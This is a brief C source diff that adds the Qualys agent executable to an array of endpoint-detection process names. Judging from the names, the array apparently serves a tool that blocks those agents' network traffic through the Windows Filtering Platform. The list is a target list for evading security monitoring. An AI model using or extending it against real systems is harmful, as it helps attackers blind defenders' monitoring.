@@ -9,7 +9,9 @@ char* edrProcess[] = {
     "elastic-endpoint.exe",
     "filebeat.exe",
 // Trellix EDR
-    "xagt.exe"
+    "xagt.exe",
+// Qualys EDR
+    "QualysAgent.exe",
 };
 
 BOOL inWfpFlag[sizeof(edrProcess) / sizeof(edrProcess[0])] = { FALSE };
